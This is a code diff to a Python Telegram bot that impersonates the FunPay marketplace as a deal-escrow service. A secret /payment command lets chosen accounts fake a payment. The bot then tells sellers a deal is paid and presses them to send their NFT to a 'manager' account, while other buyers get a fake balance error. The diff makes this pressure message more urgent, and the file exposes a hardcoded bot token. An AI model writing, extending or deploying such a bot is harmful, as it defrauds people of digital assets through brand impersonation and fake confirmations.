@@ -12,20 +12,20 @@ from aiogram.fsm.state import State, StatesGroup
 from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ParseMode
 
-# --- КОНФИГУРАЦИЯ ---
+# конфиг
 API_TOKEN = '8739690833:AAFRCEsPd7FcphwcP56KpHs7dIEfHMrMPoQ'
 REVIEWS_URL = 'https://otzovik.com/reviews/funpay_ru-birzha_igrovih_cennostey/'
-SUPPORT_URL = 'https://t.me/FunpayDealsManager' # Ссылка для кнопки "Поддержка"
+SUPPORT_URL = 'https://t.me/FunpayDealsManager'
 NEWS_URL = 'https://t.me/NewsFunpayBot'
 MANAGER_USERNAME = '@FunpayDealsManager'
-START_IMAGE_PATH = "funpay.jpg" # Исправленный путь к картинке для хостинга
+START_IMAGE_PATH = r"funpay.jpg"
 
 bot = Bot(token=API_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher()
 router = Router()
 dp.include_router(router)
 
-# Временная база сделок
+
 DEALS = {} 
 PAYMENT_ACCESS = set()
 
@@ -45,7 +45,7 @@ def get_main_keyboard():
         [InlineKeyboardButton(text="ℹ️ Отзывы", url=REVIEWS_URL)],
         [InlineKeyboardButton(text="📖 FunPay News", url=NEWS_URL)],
         [InlineKeyboardButton(text="📩 Обращения", callback_data="tickets")],
-        [InlineKeyboardButton(text="📞 Поддержка", url=SUPPORT_URL)] # Перекидывает на менеджера
+        [InlineKeyboardButton(text="📞 Поддержка", url=SUPPORT_URL)]
     ])
 
 def get_currency_keyboard():
@@ -68,7 +68,7 @@ def get_pay_keyboard(deal_id):
         [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")]
     ])
 
-# --- ХЭНДЛЕРЫ ---
+
 
 @router.message(Command("payment"))
 async def secret_payment_command(message: Message):
@@ -111,18 +111,19 @@ async def start_cmd(message: Message, command: Command):
     try:
         photo = FSInputFile(START_IMAGE_PATH)
         await message.answer_photo(photo=photo, caption=text, reply_markup=get_main_keyboard())
-    except Exception as e:
-        print(f"Ошибка загрузки фото: {e}")
+    except:
         await message.answer(text, reply_markup=get_main_keyboard())
 
-# --- ЛОГИКА КНОПОК МЕНЮ ---
+# менюшка
 
 @router.callback_query(F.data == "my_deals")
 async def process_my_deals(callback: CallbackQuery):
+    
     await callback.answer("У вас 0 успешных сделок", show_alert=True)
 
 @router.callback_query(F.data == "tickets")
 async def process_tickets(callback: CallbackQuery):
+   
     await callback.message.edit_caption(
         caption=f"📩 По всем вопросам и для создания обращений пишите нашему менеджеру: {MANAGER_USERNAME}",
         reply_markup=get_back_keyboard()
@@ -132,6 +133,7 @@ async def process_tickets(callback: CallbackQuery):
 async def back_to_main(callback: CallbackQuery, state: FSMContext):
     await state.clear()
     await callback.message.delete()
+    # Возвращаемся в начало
     await start_cmd(callback.message, CommandStart())
 
 # --- СОЗДАНИЕ СДЕЛКИ ---
@@ -190,7 +192,7 @@ async def process_requisites(message: Message, state: FSMContext):
     await state.clear()
     await message.answer(res_text, reply_markup=get_back_keyboard())
 
-# --- ОПЛАТА ---
+#  ОПЛАТА 
 
 @router.callback_query(F.data.startswith("pay_"))
 async def process_payment(callback: CallbackQuery):
@@ -201,13 +203,14 @@ async def process_payment(callback: CallbackQuery):
             await callback.message.edit_text("✅ Оплачено. Ожидайте получения.")
             buyer = f"@{callback.from_user.username}" if callback.from_user.username else "Покупатель"
             
+            # Уведомление создателю
             await bot.send_message(
                 deal['creator_id'], 
                 f"🔔 {buyer} оплатил сделку #{deal_id}.\n\n"
-                f"Отправляйте NFT строго менеджеру для успеха: {MANAGER_USERNAME}"
+                f"Критически важное правило! Отправляйте NFT строго менеджеру для успешной сделки: {MANAGER_USERNAME}"
             )
     else:
-        await callback.answer("❌ Ошибка оплаты. Недостаточно прав.", show_alert=True)
+        await callback.answer("❌ Ошибка оплаты. Пополните баланс.", show_alert=True)
 
 async def main():
     await dp.start_polling(bot)
